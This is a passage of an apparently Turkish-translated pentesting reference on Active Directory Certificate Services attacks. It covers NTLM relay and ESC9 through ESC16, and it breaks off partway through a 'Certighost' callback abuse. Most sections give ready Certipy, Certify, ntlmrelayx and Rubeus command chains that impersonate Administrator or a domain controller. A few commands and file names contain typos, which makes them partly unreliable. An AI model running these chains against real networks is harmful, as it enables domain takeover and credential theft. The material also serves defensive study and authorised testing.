Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify ile Abuse
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) ile Abuse

Certificate request, varsayılan olarak Certipy tarafından `Machine` veya `User` template'i temel alınarak yapılır; bu seçim, relay edilen account adının `$` ile bitip bitmemesine göre belirlenir. Alternatif bir template belirtmek için `-template` parameter'ı kullanılabilir.

Ardından authentication'ı zorlamak için [PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir teknik kullanılabilir. Domain controller'larla çalışırken `-template DomainController` belirtmek gerekir.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Security Extension Yok - ESC9 <a href="#id-5485" id="id-5485"></a>

### Açıklama

ESC9 olarak adlandırılan **`msPKI-Enrollment-Flag`** için yeni **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) değeri, bir sertifikaya **yeni `szOID_NTDS_CA_SECURITY_EXT` security extension** eklenmesini engeller. Bu flag, varsayılan ayar olan `1` yerine `StrongCertificateBindingEnforcement` değeri `1` olarak ayarlandığında önem kazanır; bu durum `2` ayarıyla tezat oluşturur. ESC9'un önemi, Kerberos veya Schannel için daha zayıf bir certificate mapping yönteminin istismar edilebileceği senaryolarda (ESC10'da olduğu gibi) artar; çünkü ESC9'un mevcut olmaması gereksinimleri değiştirmez.

Bu flag'in ayarının önem kazandığı koşullar şunlardır:

- `StrongCertificateBindingEnforcement` değeri `2` olarak ayarlanmamıştır (varsayılan değer `1`'dir) veya `CertificateMappingMethods`, `UPN` flag'ini içerir.
- Sertifika, `msPKI-Enrollment-Flag` ayarı içinde `CT_FLAG_NO_SECURITY_EXTENSION` flag'i ile işaretlenmiştir.
- Sertifika tarafından herhangi bir client authentication EKU belirtilmiştir.
- Başka bir hesabı compromise etmek için herhangi bir hesap üzerinde `GenericWrite` izinleri mevcuttur.

### Abuse Scenario

`John@corp.local` hesabının `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olduğunu ve hedefin `Administrator@corp.local` hesabını compromise etmek olduğunu varsayalım. `Jane@corp.local` hesabının enroll olmasına izin verilen `ESC9` certificate template'i, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` flag'i ile yapılandırılmıştır.

İlk olarak, `John` hesabının `GenericWrite` izni sayesinde `Shadow Credentials` kullanılarak `Jane` hesabının hash'i elde edilir:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Ardından, `Jane`'in `userPrincipalName` değeri, `@corp.local` etki alanı kısmı kasıtlı olarak atlanarak `Administrator` olarak değiştirilir:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bu değişiklik, `Administrator@corp.local` ifadesi `Administrator` kullanıcısının `userPrincipalName` değeri olarak ayrı kaldığından kısıtları ihlal etmez.

Bunun ardından, savunmasız olarak işaretlenen `ESC9` certificate template'i `Jane` olarak istenir:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Sertifikanın `userPrincipalName` değerinin, herhangi bir “object SID” içermeden `Administrator` değerini yansıttığı belirtilmiştir.

Ardından `Jane`'in `userPrincipalName` değeri, özgün değeri olan `Jane@corp.local` olarak geri döndürülür:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Verilen sertifikayla kimlik doğrulama denemesi artık `Administrator@corp.local` hesabının NT hash değerini verir. Sertifikada domain belirtimi bulunmadığından komut `-domain <domain>` içermelidir:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Weak Certificate Mappings - ESC10

### Açıklama

Etki alanı denetleyicisindeki iki registry anahtarı değeri ESC10 ile ilişkilendirilir:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` altındaki `CertificateMappingMethods` için varsayılan değer `0x18` (`0x8 | 0x10`) olup daha önce `0x1F` olarak ayarlanmıştı.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` altındaki `StrongCertificateBindingEnforcement` için varsayılan ayar `1` olup daha önce `0` idi.

**Durum 1**

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında.

**Durum 2**

`CertificateMappingMethods`, `UPN` bitini (`0x4`) içeriyorsa.

### Abuse Case 1

`StrongCertificateBindingEnforcement` değeri `0` olarak yapılandırıldığında, `GenericWrite` izinlerine sahip A hesabı, herhangi bir B hesabını ele geçirmek için exploit edilebilir.

Örneğin, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olan attacker, `Administrator@corp.local` hesabını ele geçirmeyi amaçlar. Prosedür ESC9'u taklit eder ve herhangi bir certificate template'in kullanılmasına izin verir.

İlk olarak `GenericWrite` kullanılarak gerçekleştirilen Shadow Credentials ile `Jane` hesabının hash'i alınır.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Ardından, `Jane`'in `userPrincipalName` değeri `Administrator` olarak değiştirilir; kısıtlama ihlalini önlemek için `@corp.local` kısmı bilerek çıkarılır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bunun ardından, varsayılan `User` template kullanılarak client authentication sağlayan bir certificate `Jane` olarak talep edilir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` değeri daha sonra özgün hali olan `Jane@corp.local` olarak geri döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Elde edilen sertifikayla kimlik doğrulaması yapmak, sertifikada domain bilgileri bulunmadığından komutta domain belirtilmesini gerektirerek `Administrator@corp.local` hesabının NT hash'ini verecektir.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kötüye Kullanım Senaryosu 2

`CertificateMappingMethods` içinde `UPN` bit flag'i (`0x4`) bulunduğunda, `GenericWrite` izinlerine sahip A hesabı, `userPrincipalName` özelliği bulunmayan tüm B hesaplarını, makine hesapları ve yerleşik etki alanı yöneticisi `Administrator` dahil, compromise edebilir.

Buradaki amaç, `GenericWrite` özelliğinden yararlanarak Shadow Credentials aracılığıyla `Jane`'in hash'ini elde etmek ve `DC$@corp.local` hesabını compromise etmektir.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'in `userPrincipalName` değeri daha sonra `DC$@corp.local` olarak ayarlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
İstemci kimlik doğrulaması için varsayılan `User` şablonu kullanılarak `Jane` adına bir sertifika istenir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` değeri bu işlemden sonra özgün haline döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel üzerinden kimlik doğrulamak için Certipy’nin `-ldap-shell` seçeneği kullanılır ve kimlik doğrulamanın `u:CORP\DC$` olarak başarılı olduğu görülür.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP shell üzerinden `set_rbcd` gibi komutlar, Resource-Based Constrained Delegation (RBCD) saldırılarını etkinleştirerek domain controller'ın ele geçirilmesini sağlayabilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Bu güvenlik açığı, `userPrincipalName` değerine sahip olmayan veya bu değeri `sAMAccountName` ile eşleşmeyen tüm kullanıcı hesaplarını da etkiler. Varsayılan olarak yükseltilmiş LDAP ayrıcalıklarına sahip olması ve `userPrincipalName` değerinin bulunmaması nedeniyle `Administrator@corp.local` öncelikli bir hedeftir.

## NTLM'yi ICPR'ye Relay Etme - ESC11

### Açıklama

CA Server `IF_ENFORCEENCRYPTICERTREQUEST` ile yapılandırılmamışsa RPC service üzerinden imzalama olmadan NTLM relay attacks gerçekleştirilebilir. [Buradaki referans](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

`Enforce Encryption for Requests` seçeneğinin Disabled olup olmadığını enumerate etmek için `certipy` kullanabilirsiniz; certipy `ESC11` Vulnerabilities değerlerini gösterecektir.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Abuse Scenario

Bir relay server kurulması gerekir:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Not: Domain controller'lar için DomainController'da `-template` belirtmemiz gerekir.

Veya [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) kullanarak:
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## ADCS CA'ya Shell access with YubiHSM - ESC12

### Açıklama

Administrators, Certificate Authority'yi anahtarları "Yubico YubiHSM2" gibi harici bir cihazda depolayacak şekilde yapılandırabilir.

CA server'a bir USB portu üzerinden USB device bağlanırsa veya CA server bir virtual machine ise bir USB device server kullanılırsa, Key Storage Provider'ın YubiHSM'deki anahtarları oluşturup kullanabilmesi için bir authentication key (bazen "password" olarak adlandırılır) gerekir.

Bu key/password, registry'de cleartext olarak `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` altında depolanır.

Referans [burada](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

Shell access elde ettiğinizde CA'nın private key'i fiziksel bir USB device üzerinde depolanıyorsa, key'i recover etmek mümkündür.

İlk olarak CA certificate'ını (bu public'tir) elde etmeniz ve ardından şunları yapmanız gerekir:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Son olarak, CA sertifikasını ve özel anahtarını kullanarak yeni, isteğe bağlı bir sertifika oluşturmak için certutil `-sign` komutunu kullanın.

## OID Group Link Abuse - ESC13

### Açıklama

`msPKI-Certificate-Policy` özniteliği, issuance policy'nin certificate template'e eklenmesini sağlar. Issuance policy'leri oluşturmaktan sorumlu `msPKI-Enterprise-Oid` nesneleri, PKI OID container'ının Configuration Naming Context'inde (CN=OID,CN=Public Key Services,CN=Services) bulunabilir. Bir policy, bu nesnenin `msDS-OIDToGroupLink` özniteliği kullanılarak bir AD grubuna bağlanabilir. Bu sayede sistem, certificate sunan bir kullanıcıyı sanki bu grubun üyesiymiş gibi yetkilendirebilir. [Buradaki referans](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Başka bir deyişle, bir kullanıcı certificate enroll etme iznine sahip olduğunda ve certificate bir OID grubuna bağlandığında, kullanıcı bu grubun ayrıcalıklarını devralabilir.

OIDToGroupLink'i bulmak için [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kullanın:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

`certipy find` veya `Certify.exe find /showAllPermissions` kullanarak bir kullanıcının sahip olduğu permission'ı bulun.

`John`, `VulnerableTemplate` üzerinde enroll etme permission'ına sahipse kullanıcı, `VulnerableGroup` grubunun ayrıcalıklarını devralabilir.

Yapması gereken tek şey template'i belirtmektir; `OIDToGroupLink` haklarına sahip bir certificate alır.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Güvenlik Açığı İçeren Certificate Renewal Yapılandırması - ESC14

### Açıklama

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping adresindeki açıklama son derece kapsamlıdır. Aşağıda orijinal metinden bir alıntı bulunmaktadır.

ESC14, temel olarak Active Directory kullanıcı veya bilgisayar hesaplarındaki `altSecurityIdentities` özniteliğinin yanlış kullanılması ya da güvenli olmayan şekilde yapılandırılmasından kaynaklanan "weak explicit certificate mapping" güvenlik açıklarını ele alır. Çok değerli bu öznitelik, yöneticilerin kimlik doğrulama amacıyla X.509 sertifikalarını bir AD hesabıyla manuel olarak ilişkilendirmesine olanak tanır. Bu açık eşlemeler mevcut olduğunda, genellikle sertifikanın SAN alanındaki UPN veya DNS adlarına ya da `szOID_NTDS_CA_SECURITY_EXT` security extension içinde gömülü SID'ye dayanan varsayılan certificate mapping mantığını geçersiz kılabilir.

`altSecurityIdentities` özniteliğinde bir sertifikayı tanımlamak için kullanılan string değeri fazla geniş olduğunda, kolayca tahmin edilebildiğinde, benzersiz olmayan sertifika alanlarına dayandığında veya kolayca spoof edilebilen sertifika bileşenlerini kullandığında bir mapping "weak" olur. Bir attacker, ayrıcalıklı bir hesabın weak şekilde tanımlanmış explicit mapping bilgileriyle eşleşen bir sertifikayı elde edebilir veya oluşturabilirse, bu sertifikayı söz konusu hesap olarak authenticate olmak ve hesabı impersonate etmek için kullanabilir.

Potansiyel olarak weak `altSecurityIdentities` mapping string örnekleri şunlardır:

- Yalnızca yaygın bir Subject Common Name (CN) üzerinden mapping: örneğin `X509:<S>CN=SomeUser`. Bir attacker, daha az güvenli bir kaynaktan bu CN değerine sahip bir sertifika elde edebilir.
- Belirli bir serial number veya subject key identifier gibi ek nitelendirmeler olmadan aşırı genel Issuer Distinguished Name (DN) veya Subject DN kullanılması: örneğin `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Bir attacker'ın yasal olarak elde edebileceği veya forge edebileceği bir sertifikada karşılayabileceği diğer tahmin edilebilir pattern'lerin ya da cryptographic olmayan identifier'ların kullanılması (bir CA compromise edilmişse veya ESC1'de olduğu gibi vulnerable bir template bulunmuşsa).

`altSecurityIdentities` mapping için çeşitli formatları destekler:

- `X509:<I>IssuerDN<S>SubjectDN` (tam Issuer ve Subject DN üzerinden mapping)
- `X509:<SKI>SubjectKeyIdentifier` (sertifikanın Subject Key Identifier extension değerini kullanarak mapping)
- `X509:<SR>SerialNumberBackedByIssuerDN` (serial number üzerinden mapping; dolaylı olarak Issuer DN ile nitelendirilir) - bu bir standard format değildir; genellikle `<I>IssuerDN<SR>SerialNumber` kullanılır.
- `X509:<RFC822>EmailAddress` (SAN içindeki RFC822 name, genellikle bir email address üzerinden mapping)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (sertifikanın raw public key değerinin SHA1 hash'i üzerinden mapping - genellikle güçlüdür)

Bu mapping'lerin security seviyesi, mapping string içinde kullanılan seçilmiş certificate identifier'ların özgüllüğüne, benzersizliğine ve cryptographic gücüne büyük ölçüde bağlıdır. Domain Controller'larda strong certificate binding mode etkin olsa bile (bu modlar öncelikli olarak SAN UPN/DNS ve SID extension tabanlı implicit mapping'leri etkiler), yanlış yapılandırılmış bir `altSecurityIdentities` girdisi, mapping mantığının kendisi hatalı veya fazla izin verici olduğunda impersonation için doğrudan bir yol oluşturabilir.
### Abuse Senaryosu

ESC14, Active Directory'deki (AD) **explicit certificate mapping** yapılarını, özellikle de `altSecurityIdentities` özniteliğini hedef alır. Bu öznitelik ayarlanmışsa (tasarım gereği veya yanlış yapılandırma nedeniyle), attacker'lar mapping ile eşleşen sertifikalar sunarak hesapları impersonate edebilir.

#### Senaryo A: Attacker `altSecurityIdentities` Üzerine Yazabilir

**Ön koşul**: Attacker'ın hedef hesabın `altSecurityIdentities` özniteliği üzerinde write izinleri vardır veya aşağıdaki izinlerden biri aracılığıyla bu yetkiyi hedef AD object'i üzerinde verme izni vardır:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Senaryo B: Hedefte Weak Mapping via X509RFC822 (Email) Vardır

- **Ön koşul**: Hedefte `altSecurityIdentities` içinde weak bir X509RFC822 mapping vardır. Bir attacker, victim'ın mail özniteliğini hedefin X509RFC822 name değeriyle eşleşecek şekilde ayarlayabilir, victim olarak bir certificate enroll edebilir ve hedef olarak authenticate olmak için bu sertifikayı kullanabilir.
#### Senaryo C: Hedefte X509IssuerSubject Mapping Vardır

- **Ön koşul**: Hedefte `altSecurityIdentities` içinde weak bir X509IssuerSubject explicit mapping vardır. Attacker, bir victim principal üzerindeki `cn` veya `dNSHostName` özniteliğini hedefin X509IssuerSubject mapping'inin subject değeriyle eşleşecek şekilde ayarlayabilir. Ardından attacker, victim olarak bir certificate enroll edebilir ve hedef olarak authenticate olmak için bu sertifikayı kullanabilir.
#### Senaryo D: Hedefte X509SubjectOnly Mapping Vardır

- **Ön koşul**: Hedefte `altSecurityIdentities` içinde weak bir X509SubjectOnly explicit mapping vardır. Attacker, bir victim principal üzerindeki `cn` veya `dNSHostName` özniteliğini hedefin X509SubjectOnly mapping'inin subject değeriyle eşleşecek şekilde ayarlayabilir. Ardından attacker, victim olarak bir certificate enroll edebilir ve hedef olarak authenticate olmak için bu sertifikayı kullanabilir.
### somut işlemler
#### Senaryo A

Certificate template `Machine` üzerinden bir certificate request edin.
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sertifikayı kaydedin ve dönüştürün
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Kimlik doğrulama (sertifikayı kullanarak)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Temizleme (isteğe bağlı)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Daha spesifik attack methods için çeşitli attack senaryolarında aşağıdakine başvurun: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Açıklama

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc adresindeki açıklama son derece kapsamlıdır. Aşağıda orijinal metinden bir alıntı yer almaktadır.

Yerleşik varsayılan version 1 certificate templates kullanılarak bir attacker, template içinde belirtilen yapılandırılmış Extended Key Usage attributes yerine tercih edilen application policies değerlerini içerecek şekilde bir CSR oluşturabilir. Tek gereksinim enrollment rights değeridir ve bu yöntem, **_WebServer_** template kullanılarak client authentication, certificate request agent ve codesigning certificates oluşturmak için kullanılabilir.

### Abuse

Aşağıdaki kaynak [bu bağlantıda]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) referans alınmıştır. Daha ayrıntılı kullanım yöntemlerini görmek için tıklayın.


Certipy'nin `find` command'u, CA unpatched durumdaysa ESC15'e karşı potansiyel olarak savunmasız V1 templates değerlerini belirlemeye yardımcı olabilir.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Scenario A: Schannel Üzerinden Doğrudan Impersonation

**Adım 1: "Client Authentication" Application Policy ve hedef UPN bilgisini enjekte ederek bir certificate talep etme.** `attacker@corp.local` saldırganı, "enrollee-supplied subject" özelliğine izin veren "WebServer" V1 template'ini kullanarak `administrator@corp.local` hesabını hedefler.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: "Enrollee supplies subject" özelliğine sahip güvenlik açığı bulunan V1 template'i.
- `-application-policies 'Client Authentication'`: CSR'nin Application Policies extension'ına `1.3.6.1.5.5.7.3.2` OID'sini enjekte eder.
- `-upn 'administrator@corp.local'`: Impersonation için SAN içindeki UPN'yi ayarlar.

**Adım 2: Elde edilen certificate'ı kullanarak Schannel (LDAPS) üzerinden Authenticate olun.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Senaryo B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Adım 1: "Enrollee supplies subject" içeren bir V1 template üzerinden, "Certificate Request Agent" Application Policy enjekte ederek bir sertifika talep edin.** Bu sertifika, attacker'ın (`attacker@corp.local`) bir enrollment agent olmasını sağlar. Burada attacker'ın kendi kimliği için herhangi bir UPN belirtilmez; amaç agent yeteneğini elde etmektir.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1` enjekte eder.

**Adım 2: Hedef ayrıcalıklı kullanıcı adına certificate istemek için "agent" certificate'ını kullanın.** Bu, 1. Adım'daki certificate'ı agent certificate olarak kullanan ESC3 benzeri bir adımdır.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Adım 3: "on-behalf-of" sertifikasını kullanarak ayrıcalıklı kullanıcı olarak kimlik doğrulaması yapın.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## CA'de Security Extension Devre Dışı (Genel Olarak)-ESC16

### Açıklama

**ESC16 (Eksik szOID_NTDS_CA_SECURITY_EXT Extension'ı Üzerinden Yetki Yükseltme)**, AD CS yapılandırması tüm sertifikalara **szOID_NTDS_CA_SECURITY_EXT** extension'ının eklenmesini zorunlu kılmıyorsa saldırganın aşağıdakileri gerçekleştirebilmesi durumunu ifade eder:

1. **SID binding olmadan** bir sertifika istemek.

2. Bu sertifikayı **herhangi bir hesap olarak authentication** için kullanmak; örneğin yüksek ayrıcalıklı bir hesabı (Domain Administrator gibi) taklit etmek.

Ayrıntılı prensip hakkında daha fazla bilgi edinmek için şu makaleye de başvurabilirsiniz:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Abuse

Aşağıdakiler [bu bağlantıda](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) referans olarak verilmiştir. Daha ayrıntılı kullanım yöntemlerini görmek için tıklayın.

Active Directory Certificate Services (AD CS) ortamının **ESC16** saldırısına karşı savunmasız olup olmadığını belirlemek için
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Adım 1: Kurban hesabının başlangıç UPN'sini okuyun (İsteğe bağlı - geri yükleme için).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Adım 2: Kurban hesabının UPN'sini hedef yöneticinin `sAMAccountName` değerine güncelleyin.
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Adım 3: (Gerekirse) "victim" hesabının kimlik bilgilerini edinin (ör. Shadow Credentials aracılığıyla).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Adım 4: ESC16 açığı bulunan CA üzerinde _uygun herhangi bir client authentication template_'inden (ör. "User") "victim" kullanıcı olarak bir sertifika isteyin.** CA, ESC16 açığı nedeniyle, template'in bu extension'a ilişkin özel ayarlarından bağımsız olarak, verilen sertifikadan SID security extension'ı otomatik olarak çıkarır. Kerberos credential cache environment variable'ını ayarlayın (shell command):
```bash
export KRB5CCNAME=victim.ccache
```
Ardından sertifikayı talep edin:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Adım 5: "victim" hesabının UPN'sini geri döndürün.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Adım 6: Hedef yöneticisi olarak kimlik doğrulaması yapın.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Rogue LDAP/LSA chase callback kimlik değiştirme (Certighost / CVE-2026-54121)

### Açıklama

**Certighost**, CA'nın verilen sertifikaya yerleştirilmesi gereken kimliği çözümlemek için requester-supplied request attributes değerlerine güvendiği bir **AD CS enrollment chase / callback path** akışını kötüye kullanır. Public PoC içinde oluşturulan request şunları içerir:

- **`cdc`**: CA'nın bağlantı kuracağı attacker-controlled host/IP
- **`rmd`**: taklit edilecek **target Domain Controller DNS name**

CA bu chase akışını izlerse, **SMB/LSA (`445`)** ve **LDAP (`389`)** üzerinden attacker'a bağlanır. Attacker, callback session'ın valid bir domain principal olarak authenticate olmasını sağlamak için **real machine account** kullanır (genellikle varsayılan **`ms-DS-MachineAccountQuota`** üzerinden oluşturulur); ancak rogue services bunun yerine **target DC**'nin identity attributes değerlerini döndürür:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

CA, **returned identity değerlerini authenticated callback principal ile cryptographically bind etmiyorsa**, session attacker-controlled machine account olarak authenticate olmuş olsa bile **Domain Controller** için bir certificate issue edebilir. Bu durum bug'ı kavramsal olarak **Certifried**'den farklı kılar: Attacker, `dNSHostName` gibi AD attributes değerlerini yeniden yazmak yerine, **CA callback resolution sırasında identity data değerlerini substitute eder**.

**Useful preconditions:**

- Düşük yetkili **domain credentials**
- Bir computer account oluşturma veya yeniden kullanma yeteneği
- **CA** tarafından attacker-controlled **`389`** ve **`445`** portlarına network reachability
- Vulnerable / unpatched CA request path (**July 14, 2026** Microsoft update'i **`cdc` için DC validation** ve ayrıca bir **resolved-SID comparison** ekledi)

Ortaya çıkan **`.pfx`**, daha sonra **PKINIT** için kullanılabilir; bu işlem bir **`.ccache`** ve published PoC flow içinde **target DC NT hash** üretir. Bu da normalde **full domain compromise** için yeterlidir.

### Kötüye Kullanım

Public PoC tüm chain'i otomatikleştirir:

1. Attacker-controlled bir **machine account** oluşturun veya yeniden kullanın.
2. `389` ve `445` portlarında **rogue LDAP ve SMB/LSA listeners** başlatın.
3. Attacker-controlled **`cdc`** ve target **`rmd`** attributes değerlerini içeren bir certificate request gönderin.
